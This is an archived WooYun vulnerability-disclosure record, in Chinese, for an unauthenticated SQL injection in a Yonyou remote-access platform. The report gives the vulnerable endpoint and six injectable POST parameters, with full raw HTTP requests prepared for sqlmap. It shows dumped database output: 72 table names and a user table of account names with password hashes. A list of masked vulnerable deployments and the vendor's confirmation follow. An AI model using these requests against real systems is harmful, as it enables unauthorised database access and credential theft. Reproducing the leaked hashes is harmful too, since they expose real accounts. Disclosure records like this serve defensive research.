{"id": 81764, "wybug_id": "wooyun-2015-0152899", "wybug_title": "用友优普远程快速接入系统SQL注入漏洞（无需登陆/影响大量企业)", "wybug_corp": "用友软件", "wybug_author": "路人甲", "wybug_date": "2015-11-09 18:44", "wybug_open_date": "2015-12-17 14:48", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射漏洞利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-10：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-11-13：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2016-01-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-17：\t细节向公众公开  简要描述： 用友某通用平台sql注入漏洞（无需登陆，无限制获取数据，影响大量企业) 详细说明：  该系统是用友的优普U8系统，用户量很大，绕过测试，该问题影响使用该平台的所有企事业单位。这里的sql注入点是root权限，可以写入文件并进一步利用。注入点在：http://xxxx/Server/CmxItem.php?pgid=System_UpdateSave post数据中的TeamName存在注入。其他注入点在后面给出吧这里我们以**.**.**.**:81为例进行说明先把payload贴这里吧，保存为XXX.txt，送给sqlmap就可以啦\nPOST /Server/CmxItem.php?pgid=System_UpdateSave HTTP/1.1Host: **.**.**.**:81User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:42.0) Gecko/20100101 Firefox/42.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh,zh-CN;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: LANGUAGES=cn; PHPSESSID=uefi1k8tmrru2hh5virr84i032Connection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 13TeamName=test\n直接看看注入点的信息\n\n看看系统中的数据库吧\n\n来看看表的信息，72张表\nweb application technology: Apache, PHP 5.4.27back-end DBMS: MySQL 5.0Database: rasdatabase[72 tables]+---------------------------+| hbadminrolegroupmembers   || hbadminrolerestrictedorgs || hbadminroletask           || hbadminroleusermembers    || hbclientgroupapplication  || hbclientgroupprinter      || hbdirectoryapplication    || hborgapplication          || hborglicensepolicy        || hborgpolicy               || hbpolicyvalues            || hbroletask                || hbserverapplication       || hbserverprinterdriver     || hbserverprintinf          || hbserverrole              || hbservertask              || hbtaskaction              || hbtaskcondition           || hbuserapplication         || hbuserdirectory           || hbuserorgs                || hbuserpolicy              || lograsarchi               || lograsconcurrenta         || lograsconcurrentus        || lograsent                 || lograssessi               || lograstaskactionhist      || lograstaskhist            || oemuserinfo               || rasactions                || rasadminroles             || rasadmintasks             || rasapplication            || rasbadprinterdriver       || rascfg                    || rasclient                 || rasclientgroup            || rascompatibilitydriver    || rasconcurrentsession      || rasconditions             || rasconnectionsetting      || rasdatabase               || rasdirectory              || rasdmzserverd             || rasdomain                 || rasgroupuser              || rasinfocollectordata      || rasjobs                   || rasjobsteps               || raslicenseinfo            || raslicensetoken           || raslicpolicy              || raslockdownpolicies       || rasmonthlyminute          || rasorgs                   || rasprinter                || rasprinterdriver          || rasproductk               || rasreqids                 || rasroles                  || rasrunningservers         || rasselection              || rasserver                 || rasstyle                  || rastasks                  || rasticketing              || rastimedsessio            || rasuser                   || rasusermng                || usermachines              |+---------------------------+\n看看用户信息\nweb application technology: Apache, PHP 5.4.27back-end DBMS: MySQL 5.0Database: rasdatabaseTable: rasuser[7 entries]+-----------+------------------------------------+| UserName  | Password                         |+-----------+----------------------------------+| RAS_01    | 0077721c169fad8e3e5aed60729d3e77 || RAS_demo  | 2ac9b6c89caa8519103dc34b3d430e6a || Ras_admin | 47c1eb03755b751363eea24fb149f616 || RAS_07    | 49786e43a863aafd294ea260d270af78 || RAS_03    | 6668367528ad4f69171224e12c65626f || RAS_02    | 78fbbcc6c709ddd4168bde5c32105f26 || RAS_04    | ae555894eeb17518168bde5c32105f26 |+-----------+----------------------------------+\n其他5个注入点在这里Post中的这下面5个参数也都存在注入，payload和利用方法类似：TeamDescriptionLogRasArchiPurgeDaysLogRasEntPurgeDaysLogUsagePurgeDaysJobRecordsPurgeDays\nPOST /Server/CmxItem.php?pgid=System_UpdateSave HTTP/1.1Host: **.**.**.**:81User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:42.0) Gecko/20100101 Firefox/42.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh,zh-CN;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: LANGUAGES=cn; PHPSESSID=uefi1k8tmrru2hh5virr84i032Connection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 13TeamDescription=test\n最后来点案例吧\n**.**.**.**:8000/download.php**.**.**.**:8888/download.php**.**.**.**:8000/download.php**.**.**.**:8080/download.php**.**.**.**:8000/download.php**.**.**.**:8080/download.php**.**.**.**:8080/download.php**.**.**.**:81/download.php**.**.**.**:81/download.php**.**.**.**/download.php**.**.**.**:81/download.php**.**.**.**:8080/download.php**.**.**.**:8888/download.php**.**.**.**:8888/download.php**.**.**.**:8000/download.php**.**.**.**:8080/download.php**.**.**.**:8000/download.php**.**.**.**:8001/download.phphttp://**.**.**.**:81/download.php**.**.**.**:8080/download.php**.**.**.**:8000/download.php**.**.**.**:8888/download.php**.**.**.**:81/download.php**.**.**.**:81/download.php**.**.**.**:8000/download.php**.**.**.**:8080/download.php**.**.**.**:81/download.php**.**.**.**:81/download.php**.**.**.**:81/download.php**.**.**.**:8000/download.php**.**.**.**:8080/download.php**.**.**.**:81/download.php**.**.**.**:81/download.php**.**.**.**:8888/download.php**.**.**.**:8888/download.php**.**.**.**:8000/download.php**.**.**.**:8000/download.php**.**.**.**:8888/download.php**.**.**.**:8080/download.php**.**.**.**:8080/download.php**.**.**.**:81/download.php**.**.**.**:8080/download.php**.**.**.**:8080/download.php**.**.**.**:8000/download.php**.**.**.**:81/download.php**.**.**.**:81/download.php**.**.**.**:81/download.php**.**.**.**:81/download.php**.**.**.**:81/download.php**.**.**.**:8080/download.php\n   漏洞证明：  见 详细说明   修复方案：  过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2015-11-10 14:03 厂商回复： 已安排开发人员修复漏洞 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}